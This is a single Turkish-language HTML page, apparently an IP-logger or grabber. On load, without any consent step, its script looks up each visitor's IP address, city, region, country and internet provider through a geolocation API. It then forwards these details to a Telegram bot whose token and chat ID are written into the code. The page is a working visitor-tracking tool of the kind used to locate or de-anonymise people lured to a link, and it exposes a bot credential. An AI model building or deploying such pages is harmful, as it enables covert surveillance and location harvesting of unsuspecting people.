<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>IP Bildirici</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
    body {
      margin: 0; padding: 0;
      background: linear-gradient(135deg, #667eea, #764ba2);
      font-family: 'Poppins', sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    .loader {
      border: 6px solid rgba(255,255,255,0.2);
      border-top: 6px solid #fff;
      border-radius: 50%;
      width: 60px; height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 1.5rem;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    h1 {
      font-weight: 600;
      margin-bottom: 1rem;
    }
    .status {
      font-size: 1.25rem;
      margin-top: 1rem;
    }
    .success {
      color: #4caf50;
    }
    .error {
      color: #ff5252;
    }
  </style>
</head>
<body>
  <div class="loader" id="loader"></div>
  <h1>Konum ve IP bilgisi gönderiliyor...</h1>
  <div class="status" id="status"></div>

  <script>
    const loader = document.getElementById('loader');
    const status = document.getElementById('status');

    const botToken = '8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U';
    const chatId = '7125066639';

    async function sendTelegramMessage(message) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      try {
        const res = await fetch(url);
        if (!res.ok) throw new Error('Telegram API hatası');
        return true;
      } catch (e) {
        console.error(e);
        return false;
      }
    }

    async function main() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (!res.ok) throw new Error('IP bilgisi alınamadı');
        const data = await res.json();

        const message =
          `📡 Yeni Ziyaretçi!\n\n` +
          `🛰️ IP: ${data.ip}\n` +
          `🌆 Şehir: ${data.city || 'Bilinmiyor'}\n` +
          `🏞️ Bölge: ${data.region || 'Bilinmiyor'}\n` +
          `🌍 Ülke: ${data.country_name || 'Bilinmiyor'}\n` +
          `🧭 Sağlayıcı: ${data.org || 'Bilinmiyor'}`;

        const sent = await sendTelegramMessage(message);

        loader.style.display = 'none';

        if (sent) {
          status.textContent = '🚀 Mesaj başarıyla gönderildi!';
          status.classList.add('success');
        } else {
          status.textContent = '❌ Mesaj gönderilemedi.';
          status.classList.add('error');
        }
      } catch (error) {
        loader.style.display = 'none';
        status.textContent = '❌ IP bilgisi alınamadı.';
        status.classList.add('error');
        console.error(error);
      }
    }

    main();
  </script>
</body>
</html>
